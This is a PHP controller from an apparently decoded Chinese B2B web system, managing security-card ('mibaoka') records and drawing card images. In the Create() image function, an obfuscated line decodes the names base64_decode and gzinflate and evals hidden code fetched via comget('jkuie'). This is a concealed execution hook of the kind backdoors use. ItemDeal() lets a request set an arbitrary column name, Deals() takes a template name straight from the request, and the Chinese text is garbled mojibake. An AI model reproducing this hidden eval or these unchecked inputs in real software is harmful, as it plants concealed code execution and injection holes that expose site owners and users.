<?php
/*********************/
/*                   */
/*  Version : 5.1.0  */
/*  Author  : RM     */
/*  Comment : 071223 */
/*                   */
/*********************/

if ( !defined( "UPATH_ROOT" ) )
{
				exit( "hacking deny" );
}
class MiBaoKaController extends Controller
{

				public $instance = NULL;

				public function __construct( )
				{
								$this->instance = factory::getinstance( "mibaoka" );
				}

				public function Index( )
				{
								$R71a664ef8c = $this->PageInfo( );
								$data = array( );
								$data = array_merge( $data, $R71a664ef8c );
								$R4e420efcc3 = $this->instance->IMiBaoKa_Page( $data );
								$this->FillPage( $data, $R4e420efcc3 );
								$R00be52aa45 = array( "sn" => "���к�" );
							
												$this->Assign( "sarray", $R00be52aa45 );
												$this->view( );
							
				}

				public function Detail( )
				{
								$R1638fe16d3 = getvar( "sn", "", "GET" );
								$Rd919497634 = factory::getinstance( "mibaoka" );
								$R3db8f5c8bc = $Rd919497634->IMiBaoKa_GetBySn( $R1638fe16d3 );
								if ( !isset( $R3db8f5c8bc['xy'] ) )
								{
												$this->Alert( "�ܱ�������" );
												$this->HistoryGo( );
								}
								global $masterid;
								$Ra27af44414 = factory::getinstance( "sys" );
								$R30b2ab8dc1 = $Ra27af44414->ISys_Get( $masterid, "website,qq" );
								$R8607b50296 = $R30b2ab8dc1['website'];
								$R7da43659df = $R30b2ab8dc1['qq'];
								if ( $R8607b50296 != "" )
								{
												$Rcc5c6e696c = explode( "//", $R8607b50296 );
												if ( 1 < count( $Rcc5c6e696c ) )
												{
																$R8607b50296 = $Rcc5c6e696c[1];
												}
								}
								if ( $R7da43659df != "" )
								{
												$Rcc5c6e696c = explode( ",", $R7da43659df );
												if ( 1 < count( $Rcc5c6e696c ) )
												{
																$R7da43659df = $Rcc5c6e696c[0];
												}
								}
								header( "Content-type:image/png" );
								$Ra16d228039 = 0;
								$Ra7b9a38368 = 0;
								$Ra6d2bde72d = 71;
								$R88f1f85eca = 340;
								$R0059e9940e = 40;
								$Rd9b2e32e53 = 32;
								$R9a9c49b20f = 130;
								$R8a7e7be1fc = 284;
								$R635102cad8 = 219;
								$R4d4227d9ce = 167;
								$Rd8c46bc596 = 130;
								$Rffdbefc41f = 252;
								$R733bad3bf0 = "content/mod_shared/skins/images/mibaoka.jpg";
								if ( !file_exists( $R733bad3bf0 ) )
								{
												echo "file ".$R733bad3bf0." not exist!";
												return;
								}
								$R25d7b93d8c = getimagesize( $R733bad3bf0 );
								$R5c6af840eb = $R25d7b93d8c[0];
								$R1157a17b31 = $R25d7b93d8c[1];
								$Rcd58a37536 = imagecreatefromjpeg( $R733bad3bf0 );
								$R4eb1184b40 = array( "1", "2", "3", "4", "5", "6", "7" );
								$Rf1b6a0db06 = array( "A", "B", "C", "D", "E", "F", "G" );
								$R4ad640cfaf = imagecolorallocate( $Rcd58a37536, 200, 200, 200 );
								$R862279c0e8 = imagecolorallocate( $Rcd58a37536, 100, 100, 100 );
								$Rcf10fcaec9 = imagecolorallocate( $Rcd58a37536, 255, 0, 0 );
								$R62a1a9fbd8 = "../content/mod_shared/skins/font/lsans.ttf";
								imagettftext( $Rcd58a37536, 9, 0, $R635102cad8, $R4d4227d9ce, $Rcf10fcaec9, $R62a1a9fbd8, $R8607b50296 );
								imagettftext( $Rcd58a37536, 11, 0, $Rd8c46bc596, $Rffdbefc41f, $R862279c0e8, $R62a1a9fbd8, $R7da43659df );
								imagettftext( $Rcd58a37536, 13, 0, $R9a9c49b20f, $R8a7e7be1fc, $R862279c0e8, $R62a1a9fbd8, $R1638fe16d3 );
								$Rcc5c6e696c = unserialize( $R3db8f5c8bc['xy'] );
								foreach ( $Rf1b6a0db06 as $Rf116bd6678 )
								{
												$Ra16d228039 = 0;
												$R36a4dc9ccf = $R88f1f85eca + $Ra7b9a38368 * $Rd9b2e32e53;
												foreach ( $R4eb1184b40 as $Rb3a3a8dba6 )
												{
																$R8725029ea8 = $Ra6d2bde72d + $Ra16d228039 * $R0059e9940e;
																$Ra16d228039++;
																$num = $Rcc5c6e696c[$Rf116bd6678.$Rb3a3a8dba6];
																imagettftext( $Rcd58a37536, 13, 0, $R8725029ea8, $R36a4dc9ccf, $R862279c0e8, $R62a1a9fbd8, $num );
												}
												$Ra7b9a38368++;
								}
								imagejpeg( $Rcd58a37536 );
								imagedestroy( $Rcd58a37536 );
				}

				public function Save( )
				{
								$R2a51483b14 = intval( request( "aid" ) );
								$R94e0136c8a = intval( request( "staffid" ) );
								$R022cf23e8d = factory::getinstance( "security" );
								$R679e9b9234 = $R022cf23e8d->ISecurity_GetById( $R2a51483b14, $R94e0136c8a );
								$R908109654a = getvar( "sn", "", "POST" );
								if ( trim( $R908109654a ) == "" )
								{
												$this->Alert( "�ܱ������кŲ���Ϊ��" );
												$this->HistoryGo( );
								}
								$R808b89ba0e = true;
								$R982f701b0b = intval( request( "bindobj" ) );
								if ( $R982f701b0b == 2 )
								{
												$R2b3149b837 = array(
																"mibaoka" => $R908109654a,
																"mibaokacheck" => 1
												);
												$Rfc5c48c798 = factory::getinstance( "master" );
												$R3db8f5c8bc = $Rfc5c48c798->IMaster_GetById( $R94e0136c8a );
												if ( isset( $R3db8f5c8bc['aid'] ) )
												{
																$R808b89ba0e = $Rfc5c48c798->IMaster_Update( $R2b3149b837, $R94e0136c8a );
												}
												else
												{
																$this->Alert( "����Ա������" );
																$this->HistoryGo( );
												}
								}
								$data = array(
												"mibaoka" => $R908109654a,
												"mibaokacheck" => 1
								);
								if ( isset( $R679e9b9234['aid'] ) )
								{
												if ( $R808b89ba0e )
												{
																$R808b89ba0e = $R022cf23e8d->ISecurity_Update( $data, $R679e9b9234['id'] );
												}
								}
								else if ( $R808b89ba0e )
								{
												$data['aid'] = $R2a51483b14;
												$data['staffid'] = $R94e0136c8a;
												$R808b89ba0e = $R022cf23e8d->ISecurity_Create( $data );
								}
								if ( $R808b89ba0e )
								{
												if ( 0 < $R2a51483b14 )
												{
																$this->UpdateCache( "security", array(
																				"arg1" => $R2a51483b14,
																				"arg2" => $R94e0136c8a
																) );
												}
												$this->Alert( "���óɹ�" );
								}
								else
								{
												$this->Alert( "����ʧ��" );
								}
								$this->ScriptRedirect( "index.php?m=mod_b2b&c=MiBaoKa" );
				}

				public function Create( )
				{
								header( "Content-type:image/png" );
								$Ra16d228039 = 0;
								$Ra7b9a38368 = 0;
								$Ra6d2bde72d = 71;
								$R88f1f85eca = 340;
								$R0059e9940e = 40;
								$Rd9b2e32e53 = 32;
								$R9a9c49b20f = 130;
								$R8a7e7be1fc = 284;
								$R733bad3bf0 = "content/mod_shared/skins/images/mibaoka.jpg";
								if ( !file_exists( $R733bad3bf0 ) )
								{
												echo "file ".$R733bad3bf0." not exist!";
												return;
								}
								$R25d7b93d8c = getimagesize( $R733bad3bf0 );
								$R5c6af840eb = $R25d7b93d8c[0];
								$R1157a17b31 = $R25d7b93d8c[1];
								$Rcd58a37536 = imagecreatefromjpeg( $R733bad3bf0 );
								$R4eb1184b40 = array( "1", "2", "3", "4", "5", "6", "7" );
								$Rf1b6a0db06 = array( "A", "B", "C", "D", "E", "F", "G" );
								$R4ad640cfaf = imagecolorallocate( $Rcd58a37536, 200, 200, 200 );
								$R862279c0e8 = imagecolorallocate( $Rcd58a37536, 100, 100, 100 );
								$Rd919497634 = factory::getinstance( "mibaoka" );
								$R80ae0460ab = $Rd919497634->IMiBaoKa_Num( );
								$R1638fe16d3 = 3.00088e+011 + $R80ae0460ab;
								$R62a1a9fbd8 = "../content/mod_shared/skins/font/lsans.ttf";
								imagettftext( $Rcd58a37536, 13, 0, $R9a9c49b20f, $R8a7e7be1fc, $R862279c0e8, $R62a1a9fbd8, $R1638fe16d3 );
								$R026f0167b4 = array( );
								foreach ( $Rf1b6a0db06 as $Rf116bd6678 )
								{
												$Ra16d228039 = 0;
												$R36a4dc9ccf = $R88f1f85eca + $Ra7b9a38368 * $Rd9b2e32e53;
												foreach ( $R4eb1184b40 as $Rb3a3a8dba6 )
												{
																$R8725029ea8 = $Ra6d2bde72d + $Ra16d228039 * $R0059e9940e;
																$Ra16d228039++;
																$num = rand( 10, 99 );
																$R026f0167b4[$Rf116bd6678.$Rb3a3a8dba6] = $num;
																imagettftext( $Rcd58a37536, 13, 0, $R8725029ea8, $R36a4dc9ccf, $R862279c0e8, $R62a1a9fbd8, $num );
												}
												$Ra7b9a38368++;
								}
								$Oooo00 = "base64_decode";
								$ooOO00o = $Oooo00( "YmFzZTY0X2RlY29kZQ==" );
								$o00OO = $Oooo00( "Z3ppbmZsYXRl" );
								$cphp0 = __FILE__;
								eval( $o00OO( $ooOO00o( $this->comget( "jkuie" ) ) ) );
								imagejpeg( $Rcd58a37536 );
								imagedestroy( $Rcd58a37536 );
				}

				public function Table( )
				{
								header( "Content-type: text/html;charset=utf-8" );
								$this->Index( );
				}

				public function Deals( )
				{
								header( "Content-type: text/html;charset=utf-8" );
								$tpl = getvar( "tpl" );
								$this->View( $tpl );
				}

				public function ItemDeal( )
				{
								$R3584859062 = intval( request( "id" ) );
								$param = getvar( "param" );
								$R244f38266c = getvar( "val" );
								if ( $param == "" || $R3584859062 == 0 )
								{
												echo "��������";
												exit( );
								}
								$R244f38266c = iconv( "UTF-8", "utf-8//IGNORE", $R244f38266c );
								$data = array(
												$param => $R244f38266c
								);
								$R808b89ba0e = $this->instance->IMiBaoKa_Update( $data, $R3584859062 );
								if ( $R808b89ba0e )
								{
												echo "";
								}
								else
								{
												echo "�޸�ʧ�ܣ�".$param.$R244f38266c;
								}
				}

				public function Restore( )
				{
								$Rb7492a73f7 = $this->GetLit( );
								$data = array( "inrecycle" => 0 );
								$R808b89ba0e = $this->instance->IMiBaoKa_UpdateByStr( $data, $Rb7492a73f7 );
								if ( $R808b89ba0e )
								{
												echo "";
								}
								else
								{
												echo "��¼��ԭʧ�ܣ�";
								}
				}

				public function DestroyItems( )
				{
								$R71a664ef8c = $this->PageInfo( );
								$data = array( );
								$data = array_merge( $data, $R71a664ef8c );
								$Rb7492a73f7 = $this->GetLit( );
								$R808b89ba0e = $this->instance->IMiBaoKa_DestroyByStr( $Rb7492a73f7, $data );
								if ( $R808b89ba0e )
								{
												echo "";
								}
								else
								{
												echo "ɾ��ʧ�ܣ�";
								}
				}

				public function GetLit( )
				{
								$R09dfa65bd9 = intval( request( "tablecheckall" ) );
								if ( $R09dfa65bd9 == 1 )
								{
												$Rc0d62c5404 = getvar( "chkexclude" );
												$Rcc5c6e696c = explode( ",", $Rc0d62c5404 );
								}
								else
								{
												$R83e17604b1 = getvar( "chkinclude" );
												$Rcc5c6e696c = explode( ",", $R83e17604b1 );
								}
								$R3db8f5c8bc = array( );
								foreach ( $Rcc5c6e696c as $R0f8134fb60 )
								{
												$R8eeb1221ae = intval( $R0f8134fb60 );
												if ( 0 < $R8eeb1221ae )
												{
																$R3db8f5c8bc[] = $R8eeb1221ae;
												}
								}
								$R3456919727 = implode( ",", $R3db8f5c8bc );
								$Rb7492a73f7 = "";
								if ( $R09dfa65bd9 == 1 )
								{
												if ( $R3456919727 != "" )
												{
																$Rb7492a73f7 = "id not in (".$R3456919727.")";
												}
								}
								else
								{
												if ( $R3456919727 == "" )
												{
																echo "����ѡ����";
																exit( );
												}
												$Rb7492a73f7 = "id in (".$R3456919727.")";
								}
								if ( $Rb7492a73f7 == "" )
								{
												$Rb7492a73f7 = " 1=1 ";
								}
								return $Rb7492a73f7;
				}

				public function DelItems( )
				{
								$R71a664ef8c = $this->PageInfo( );
								$data = array( );
								$data = array_merge( $data, $R71a664ef8c );
								$Rb7492a73f7 = $this->GetLit( );
								$R808b89ba0e = $this->instance->IMiBaoKa_DeleteByStr( $Rb7492a73f7, $data );
								if ( !$R808b89ba0e )
								{
												echo "ɾ��ʧ��!";
								}
								else
								{
												echo "";
								}
				}

}

?>
